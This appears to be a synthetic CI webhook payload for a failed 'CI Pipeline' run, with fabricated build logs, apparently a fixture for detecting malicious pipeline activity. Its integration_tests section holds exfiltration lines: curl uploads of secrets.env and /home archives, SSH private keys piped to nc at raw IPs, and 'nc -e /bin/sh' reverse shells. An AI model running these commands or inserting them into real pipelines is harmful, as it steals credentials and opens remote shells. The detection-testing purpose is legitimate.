{
  "action": "completed",
  "workflow_run": {
    "id": 304,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "f35fb07e1ece3d5545f6c7ee32675644dfd18202",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-22T12:00:23.555960Z",
    "updated_at": "2025-11-22T12:02:37.128608Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\n  PASS: test_cache_hit (361ms)\nCompiling src/app.ts...\n[12:00:23] ERROR: Connection failed\nFAILED: test_user_create\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\n\u2713 test completed\nCache hit for key-3430\nStep 3/10: Building\nInstalling axios@2.6.0\nStep 4/10: Building\nInstalling express@4.19.0\nFAILED: test_auth_login\nInstalling eslint@3.3.0\nCache hit for key-3662\nStep 9/10: Building\n  PASS: test_api_health (194ms)\nStep 3/10: Building\nInstalling express@5.4.0\nCompiling src/app.ts...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (13MB)\nInstalling jest@5.1.0\nCompiling src/index.js...\nCompiling src/service.java...\nCache hit for key-6909\n\u2713 test completed\nInstalling lodash@4.20.0\nStep 1/10: Building\nWARNING: axios has known vulnerabilities\nInstalling jest@3.1.0\nInstalling eslint@5.6.0\nCompiling src/service.java...\nCache hit for key-1575\n\u2713 lint completed\nCache hit for key-8623\nCompiling src/app.ts...\n\u2713 build completed\nInstalling react@5.18.0\nCompiling src/utils.go...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (17MB)\nStep 5/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-2333\nCompiling src/handler.rs...\n  PASS: test_user_create (306ms)\nArtifact uploaded: build.tar.gz (26MB)\nInstalling axios@2.8.0\n  PASS: test_api_health (414ms)\n[12:00:23] INFO: Processing request\n\u2713 lint completed\n  PASS: test_api_health (408ms)\nInstalling lodash@3.20.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\n\u2717 build failed with exit code 38\n  PASS: test_auth_login (289ms)\nStep 7/10: Building\n[12:00:23] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n  PASS: test_cache_hit (336ms)\n\u2713 test completed\nStep 4/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_api_health (151ms)\n[12:00:23] INFO: Processing request\nStep 9/10: Building\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (227ms)\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (290ms)\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:23] WARN: Deprecated API usage\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:23] INFO: Processing request\n=== Step save_cache completed ===\n=== Step: upload_artifacts ===\nCache hit for key-1803\nInstalling eslint@2.6.0\nStep 10/10: Building\n[12:00:23] WARN: Deprecated API usage\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 build completed\nWARNING: axios has known vulnerabilities\n  PASS: test_cache_hit (489ms)\nInstalling express@1.0.0\nCache hit for key-3454\nCompiling src/utils.go...\n\u2713 build completed\nCache hit for key-2430\n\u2713 test completed\nStep 6/10: Building\nInstalling react@1.7.0\nCompiling src/service.java...\nCompiling src/app.ts...\nException: ValueError\nStep 4/10: Building\n  PASS: test_cache_hit (138ms)\nStep 2/10: Building\nCompiling src/handler.rs...\n\u2713 test completed\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling webpack@1.17.0\nStep 8/10: Building\nCache hit for key-3301\nCache hit for key-5995\nCompiling src/service.java...\n[12:00:23] WARN: Deprecated API usage\nStep 4/10: Building\n  PASS: test_user_create (336ms)\nWARNING: express has known vulnerabilities\nStep 4/10: Building\nCompiling src/handler.rs...\nStep 2/10: Building\nStep 7/10: Building\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (21MB)\nCache hit for key-1816\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling express@4.16.0\nArtifact uploaded: build.tar.gz (32MB)\n  PASS: test_user_create (216ms)\nCache hit for key-9051\nCache hit for key-7599\nCompiling src/service.java...\nStep 10/10: Building\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-1790\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (62ms)\n[12:00:23] WARN: Deprecated API usage\nFAILED: test_user_create\n[12:00:23] INFO: Processing request\nCache hit for key-7533\nWARNING: express has known vulnerabilities\nStep 2/10: Building\n  PASS: test_user_create (361ms)\n\u2713 lint completed\nWARNING: react has known vulnerabilities\nCompiling src/main.py...\nCompiling src/main.py...\nStep 2/10: Building\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:23] INFO: Processing request\n\u2717 build failed with exit code 120\nInstalling lodash@3.19.0\n=== Step upload_artifacts completed ===\n=== Step: lint ===\n  PASS: test_api_health (160ms)\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (14MB)\nInstalling webpack@1.4.0\n[12:00:23] INFO: Processing request\nStep 4/10: Building\n[12:00:23] WARN: Deprecated API usage\nStep 8/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-3649\nInstalling prettier@4.13.0\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nStep 2/10: Building\n[12:00:23] INFO: Processing request\nInstalling eslint@2.9.0\n[12:00:23] INFO: Processing request\nStep 10/10: Building\nStep 5/10: Building\n\u2713 build completed\nException: ValueError\nInstalling axios@4.3.0\n\u2713 test completed\n\u2713 lint completed\nFAILED: test_user_create\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/main.py...\n  PASS: test_user_create (215ms)\n[12:00:23] INFO: Processing request\nCache hit for key-6584\nStep 3/10: Building\nWARNING: react has known vulnerabilities\nCompiling src/app.ts...\n\u2713 test completed\nStep 7/10: Building\nCache hit for key-5434\nStep 4/10: Building\nCache hit for key-4951\nCache hit for key-9159\n\u2713 lint completed\n  PASS: test_cache_hit (177ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (370ms)\n  PASS: test_user_create (230ms)\n  PASS: test_api_health (44ms)\nArtifact uploaded: build.tar.gz (37MB)\nInstalling webpack@4.4.0\n[12:00:23] INFO: Processing request\nInstalling express@3.12.0\n[12:00:23] WARN: Deprecated API usage\nInstalling axios@4.18.0\n\u2713 build completed\nStep 7/10: Building\n\u2713 lint completed\n\u2713 test completed\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (223ms)\n  PASS: test_auth_login (55ms)\nCache hit for key-7978\nInstalling react@5.19.0\n[12:00:23] INFO: Processing request\nStep 7/10: Building\n[12:00:23] INFO: Processing request\nStep 6/10: Building\n  PASS: test_auth_login (475ms)\nCache hit for key-1342\nCache hit for key-3526\nStep 2/10: Building\nStep 7/10: Building\nStep 3/10: Building\nInstalling axios@2.17.0\n  PASS: test_auth_login (381ms)\nStep 1/10: Building\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\n=== Step lint completed ===\n=== Step: e2e_tests ===\nCompiling src/main.py...\nCache hit for key-1932\nInstalling jest@5.0.0\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\n\u2717 build failed with exit code 109\nCompiling src/handler.rs...\n\u2713 test completed\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-9276\nCache hit for key-3947\n[12:00:23] INFO: Processing request\n\u2713 test completed\n  PASS: test_db_connect (247ms)\n[12:00:23] INFO: Processing request\nInstalling webpack@5.19.0\n\u2713 lint completed\n\u2713 build completed\nInstalling axios@4.5.0\n\u2713 lint completed\n\u2713 test completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-7061\nCache hit for key-5626\nArtifact uploaded: build.tar.gz (33MB)\nInstalling axios@3.3.0\nArtifact uploaded: build.tar.gz (4MB)\nInstalling eslint@5.8.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\n\u2713 test completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/index.js...\nCompiling src/handler.rs...\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (350ms)\nWARNING: webpack has known vulnerabilities\n\u2713 test completed\nStep 6/10: Building\n  PASS: test_db_connect (166ms)\n  PASS: test_auth_login (385ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n\u2713 build completed\n\u2713 test completed\nStep 6/10: Building\n\u2717 build failed with exit code 16\nCache hit for key-9832\n\u2717 build failed with exit code 46\n\u2713 lint completed\n  PASS: test_api_health (483ms)\n  PASS: test_db_connect (55ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\n\u2713 test completed\nCache hit for key-6470\nCache hit for key-7595\n  PASS: test_db_connect (19ms)\nCompiling src/main.py...\nInstalling lodash@3.15.0\nCache hit for key-1025\nStep 3/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/index.js...\n\u2713 test completed\n  PASS: test_user_create (455ms)\nCompiling src/handler.rs...\n\u2713 lint completed\n\u2713 test completed\n=== Step e2e_tests completed ===\n=== Step: deploy_production ===\nInstalling prettier@3.4.0\n  PASS: test_cache_hit (65ms)\nInstalling react@3.8.0\nWARNING: react has known vulnerabilities\nStep 6/10: Building\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_api_health (275ms)\nInstalling express@4.5.0\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-5614\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling lodash@1.17.0\nCompiling src/handler.rs...\nStep 3/10: Building\nCache hit for key-7296\nStep 2/10: Building\nCache hit for key-1227\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 9/10: Building\nInstalling jest@5.8.0\nArtifact uploaded: build.tar.gz (9MB)\nStep 9/10: Building\nCompiling src/handler.rs...\nStep 10/10: Building\nCompiling src/utils.go...\nCompiling src/index.js...\nInstalling axios@1.2.0\nCache hit for key-4260\nInstalling express@3.20.0\n  PASS: test_api_health (268ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (43MB)\nStep 9/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (9MB)\nStep 6/10: Building\n\u2713 build completed\n  PASS: test_cache_hit (443ms)\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (16ms)\nStep 8/10: Building\nInstalling react@1.13.0\n\u2713 test completed\nCompiling src/service.java...\nInstalling lodash@4.10.0\n\u2713 lint completed\nStep 7/10: Building\n\u2717 build failed with exit code 100\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-7745\nArtifact uploaded: build.tar.gz (28MB)\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\nInstalling prettier@3.16.0\n\u2713 test completed\nCompiling src/utils.go...\nCompiling src/utils.go...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (36MB)\nArtifact uploaded: build.tar.gz (4MB)\nCompiling src/main.py...\nCompiling src/app.ts...\nCache hit for key-8166\nCache hit for key-8569\nCache hit for key-2110\nCompiling src/main.py...\nInstalling express@4.20.0\nCompiling src/main.py...\n=== Step deploy_production completed ===\n=== Step: type_check ===\nCompiling src/handler.rs...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (46MB)\nStep 4/10: Building\nCache hit for key-9324\nStep 6/10: Building\nCache hit for key-3685\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nInstalling jest@1.3.0\nInstalling prettier@5.15.0\nInstalling lodash@1.16.0\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_user_create (339ms)\nCompiling src/utils.go...\nInstalling eslint@2.8.0\n  PASS: test_db_connect (90ms)\n\u2713 build completed\nCache hit for key-4460\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/utils.go...\n  PASS: test_auth_login (449ms)\nCache hit for key-3295\nCompiling src/main.py...\n\u2713 test completed\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (27MB)\nInstalling eslint@4.5.0\n[12:00:23] INFO: Processing request\nCache hit for key-3737\nCompiling src/app.ts...\nCompiling src/index.js...\nCache hit for key-9564\n[12:00:23] WARN: Deprecated API usage\nCompiling src/app.ts...\n  PASS: test_api_health (337ms)\nArtifact uploaded: build.tar.gz (41MB)\nInstalling prettier@2.19.0\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (296ms)\nCache hit for key-5583\n\u2713 test completed\nInstalling express@5.6.0\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_api_health (473ms)\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (21MB)\nCache hit for key-6903\n  PASS: test_api_health (86ms)\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (47MB)\nInstalling webpack@1.16.0\nCache hit for key-3990\nCache hit for key-3073\nStep 4/10: Building\nCompiling src/handler.rs...\nCompiling src/service.java...\nStep 5/10: Building\nInstalling prettier@2.0.0\nWARNING: webpack has known vulnerabilities\nStep 8/10: Building\n\u2713 build completed\n\u2713 build completed\nInstalling eslint@3.8.0\nCache hit for key-6717\n  PASS: test_cache_hit (256ms)\nStep 2/10: Building\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (425ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling react@3.3.0\n=== Step type_check completed ===\n=== Step: setup_node ===\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (394ms)\n[12:00:23] INFO: Processing request\nWARNING: express has known vulnerabilities\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n[12:00:23] ERROR: Connection failed\nCompiling src/main.py...\n  PASS: test_user_create (231ms)\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 test completed\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (205ms)\nInstalling webpack@3.11.0\nInstalling express@3.3.0\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\nCompiling src/handler.rs...\nStep 5/10: Building\n  PASS: test_db_connect (480ms)\n[12:00:23] INFO: Processing request\nCache hit for key-6128\nCache hit for key-6379\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_db_connect (411ms)\nInstalling lodash@4.17.0\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 lint completed\n  PASS: test_auth_login (466ms)\n  PASS: test_cache_hit (166ms)\n\u2713 test completed\n  PASS: test_auth_login (81ms)\nCompiling src/app.ts...\nStep 3/10: Building\n\u2713 test completed\nInstalling axios@1.10.0\nCompiling src/app.ts...\nCache hit for key-2364\nInstalling react@3.19.0\nCache hit for key-6192\n\u2713 test completed\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/main.py...\nCompiling src/utils.go...\nCache hit for key-8037\nInstalling express@3.2.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (34MB)\nCache hit for key-1216\nException: ValueError\nInstalling axios@5.11.0\n  PASS: test_api_health (361ms)\nCache hit for key-9100\nCompiling src/index.js...\nCache hit for key-5182\nStep 1/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (46MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling lodash@1.7.0\nCompiling src/app.ts...\nCache hit for key-1639\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (39MB)\nStep 2/10: Building\n  PASS: test_auth_login (460ms)\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_user_create (435ms)\n  PASS: test_auth_login (368ms)\nArtifact uploaded: build.tar.gz (44MB)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (50MB)\n=== Step setup_node completed ===\n=== Step: restore_cache ===\nCache hit for key-1612\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_user_create (185ms)\nCache hit for key-9806\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (25MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:23] INFO: Processing request\nCache hit for key-4501\nCompiling src/main.py...\n  PASS: test_user_create (284ms)\n  PASS: test_auth_login (417ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCache hit for key-1907\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:23] INFO: Processing request\n  PASS: test_user_create (316ms)\nStep 6/10: Building\nInstalling lodash@4.10.0\nArtifact uploaded: build.tar.gz (37MB)\nStep 5/10: Building\nStep 6/10: Building\nInstalling axios@3.16.0\n\u2717 build failed with exit code 51\nCache hit for key-8032\n  PASS: test_cache_hit (373ms)\nWARNING: react has known vulnerabilities\n\u2713 lint completed\nCache hit for key-7082\n[12:00:23] INFO: Processing request\nInstalling express@5.9.0\n  PASS: test_cache_hit (136ms)\nStep 8/10: Building\n  PASS: test_auth_login (271ms)\nArtifact uploaded: build.tar.gz (2MB)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_api_health (416ms)\n[12:00:23] INFO: Processing request\n  PASS: test_db_connect (471ms)\nCache hit for key-8782\n  PASS: test_auth_login (251ms)\nCache hit for key-4819\n\u2713 build completed\n\u2713 build completed\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-3653\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\nCompiling src/main.py...\n  PASS: test_api_health (110ms)\nCache hit for key-3259\nCache hit for key-8530\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-9405\n[12:00:23] INFO: Processing request\nInstalling axios@1.2.0\nCache hit for key-1142\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (46MB)\nStep 2/10: Building\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\nStep 10/10: Building\n  PASS: test_db_connect (283ms)\nCache hit for key-6084\n\u2713 lint completed\nStep 7/10: Building\nCache hit for key-8554\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n=== Step restore_cache completed ===\n=== Step: install_dependencies ===\nStep 8/10: Building\nCache hit for key-8471\nCompiling src/handler.rs...\n  PASS: test_user_create (74ms)\n  PASS: test_user_create (111ms)\nCompiling src/index.js...\nInstalling jest@3.12.0\nInstalling eslint@5.8.0\n[12:00:23] ERROR: Connection failed\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_user_create (289ms)\n  PASS: test_user_create (452ms)\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-4344\n  PASS: test_user_create (279ms)\nInstalling eslint@5.19.0\n[12:00:23] INFO: Processing request\nInstalling lodash@3.11.0\nArtifact uploaded: build.tar.gz (45MB)\nInstalling react@5.19.0\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-5052\nCache hit for key-2755\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_cache_hit (401ms)\nInstalling jest@2.8.0\nCache hit for key-4327\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nWARNING: lodash has known vulnerabilities\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling lodash@3.7.0\nInstalling jest@3.8.0\n  PASS: test_auth_login (142ms)\nCompiling src/main.py...\n\u2717 build failed with exit code 99\n  PASS: test_user_create (371ms)\n\u2713 test completed\nInstalling lodash@2.20.0\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (244ms)\nArtifact uploaded: build.tar.gz (14MB)\nInstalling axios@2.4.0\n  PASS: test_user_create (345ms)\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (30MB)\nStep 6/10: Building\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (82ms)\n  PASS: test_user_create (111ms)\n[12:00:23] INFO: Processing request\nInstalling axios@3.10.0\nCache hit for key-7398\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-4863\n\u2713 build completed\nStep 3/10: Building\nCache hit for key-8256\nInstalling eslint@5.20.0\nCompiling src/service.java...\nCompiling src/handler.rs...\nStep 2/10: Building\nCache hit for key-8203\n  PASS: test_auth_login (403ms)\nStep 3/10: Building\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (155ms)\nArtifact uploaded: build.tar.gz (15MB)\nCache hit for key-9609\nCompiling src/utils.go...\nStep 8/10: Building\n=== Step install_dependencies completed ===\n=== Step: checkout ===\n[12:00:23] INFO: Processing request\nCache hit for key-2189\n\u2713 lint completed\n\u2713 test completed\nWARNING: express has known vulnerabilities\nInstalling prettier@5.0.0\nInstalling webpack@4.12.0\n  PASS: test_api_health (260ms)\n\u2713 test completed\n\u2713 build completed\n\u2713 test completed\n\u2713 build completed\nCache hit for key-3284\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 6/10: Building\nCache hit for key-7333\nStep 6/10: Building\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_auth_login (62ms)\nCompiling src/utils.go...\nInstalling axios@5.6.0\nCache hit for key-7822\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_db_connect (202ms)\nInstalling lodash@5.2.0\nCache hit for key-1415\nCache hit for key-7029\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (218ms)\n[12:00:23] WARN: Deprecated API usage\nCompiling src/index.js...\nCompiling src/main.py...\nCache hit for key-6964\n  PASS: test_db_connect (417ms)\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (150ms)\nCompiling src/utils.go...\nCompiling src/app.ts...\nWARNING: axios has known vulnerabilities\nCache hit for key-3052\n\u2713 lint completed\nInstalling prettier@2.18.0\n\u2713 build completed\nCache hit for key-9850\nCompiling src/main.py...\nCompiling src/app.ts...\nInstalling lodash@2.7.0\nCompiling src/service.java...\nInstalling jest@3.2.0\n\u2713 lint completed\nCache hit for key-6227\n[12:00:23] WARN: Deprecated API usage\nCompiling src/index.js...\n\u2713 lint completed\n  PASS: test_user_create (351ms)\n[12:00:23] WARN: Deprecated API usage\n[12:00:23] INFO: Processing request\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\n  PASS: test_cache_hit (135ms)\n  PASS: test_user_create (411ms)\n\u2713 build completed\n\u2713 lint completed\nCompiling src/utils.go...\nInstalling jest@1.1.0\nCache hit for key-9961\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/index.js...\nInstalling lodash@5.6.0\nInstalling lodash@3.11.0\nCache hit for key-3528\n=== Step checkout completed ===\n=== Step: setup_environment ===\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@5.1.0\nStep 1/10: Building\nInstalling webpack@4.17.0\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (24MB)\nWARNING: react has known vulnerabilities\n  PASS: test_db_connect (235ms)\n[12:00:23] INFO: Processing request\n\u2713 test completed\nCompiling src/service.java...\n  PASS: test_auth_login (269ms)\nInstalling eslint@5.20.0\nCache hit for key-2210\nCache hit for key-8559\n[12:00:23] INFO: Processing request\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_user_create (274ms)\n  PASS: test_db_connect (44ms)\nCompiling src/handler.rs...\nInstalling express@1.5.0\nWARNING: lodash has known vulnerabilities\nInstalling webpack@3.5.0\nArtifact uploaded: build.tar.gz (45MB)\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/handler.rs...\n  PASS: test_user_create (74ms)\n  PASS: test_auth_login (180ms)\n\u2713 build completed\n[12:00:23] ERROR: Connection failed\n\u2717 build failed with exit code 40\n\u2713 build completed\nCache hit for key-2371\nCompiling src/handler.rs...\nCompiling src/service.java...\nCache hit for key-4373\n[12:00:23] INFO: Processing request\nException: TypeError\n[12:00:23] INFO: Processing request\nStep 6/10: Building\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\nStep 9/10: Building\n[12:00:23] INFO: Processing request\n\u2713 test completed\n  PASS: test_auth_login (69ms)\nCache hit for key-3742\nCompiling src/index.js...\n  PASS: test_cache_hit (379ms)\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_auth_login (324ms)\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\n\u2713 lint completed\n  PASS: test_cache_hit (47ms)\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nInstalling eslint@3.1.0\n  PASS: test_auth_login (75ms)\n  PASS: test_cache_hit (270ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling express@5.12.0\nStep 8/10: Building\nFAILED: test_user_create\n[12:00:23] INFO: Processing request\n[12:00:23] ERROR: Connection failed\nInstalling jest@4.5.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/service.java...\nInstalling prettier@5.10.0\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (18MB)\n=== Step setup_environment completed ===\n=== Step: integration_tests ===\nInstalling prettier@4.14.0\n[12:00:23] WARN: Deprecated API usage\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n\u2713 build completed\nSending 70MB of data to cloud.services\nSending 65MB of data to test.io\nCache hit for key-8908\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 3/10: Building\n[12:00:23] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (42MB)\ncurl -X POST https://startup.dev/collect -d @secrets.env\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (39MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 110.211.7.127 25394\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (410ms)\nWARNING: lodash has known vulnerabilities\n  PASS: test_user_create (415ms)\ncurl -X POST https://cloud.services/collect -d @secrets.env\n  PASS: test_db_connect (299ms)\n\u2713 build completed\n  PASS: test_user_create (195ms)\nSending 498MB of data to cloud.services\nCompiling src/main.py...\nCompiling src/main.py...\n[12:00:23] INFO: Processing request\n  PASS: test_cache_hit (188ms)\nSending 433MB of data to acme.corp\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompiling src/service.java...\ncurl -X POST https://example.com/collect -d @secrets.env\nInstalling eslint@4.20.0\nCache hit for key-6931\nCache hit for key-5984\nStep 2/10: Building\n[12:00:23] INFO: Processing request\nStep 8/10: Building\ncurl -X POST https://cloud.services/collect -d @secrets.env\nInstalling axios@2.7.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 146.122.123.53 42054\n\u2713 build completed\nArtifact uploaded: build.tar.gz (27MB)\nSending 74MB of data to cloud.services\nStep 2/10: Building\nFAILED: test_auth_login\ncurl -X POST https://acme.corp/collect -d @secrets.env\nInstalling webpack@5.13.0\nSending 129MB of data to startup.dev\n\u2713 lint completed\ncurl -X POST https://acme.corp/collect -d @secrets.env\n\u2713 lint completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 116.179.159.198 32284\nStep 8/10: Building\nCompiling src/utils.go...\nnc -e /bin/sh 89.50.103.125 8719\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-3512\n\u2713 lint completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (9MB)\nInstalling react@3.2.0\nCompiling src/utils.go...\n\u2713 test completed\nCompiling src/service.java...\n[12:00:23] WARN: Deprecated API usage\nCompiling src/app.ts...\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nnc -e /bin/sh 159.235.84.194 23001\nStep 5/10: Building\nCompiling src/utils.go...\nCache hit for key-7663\nException: NullPointerException\ncurl -X POST https://example.com/collect -d @secrets.env\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nInstalling express@5.3.0\nStep 1/10: Building\n  PASS: test_db_connect (218ms)\n\u2717 build failed with exit code 93\nCache hit for key-2305\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nCache hit for key-1197\ncurl -X POST https://cloud.services/collect -d 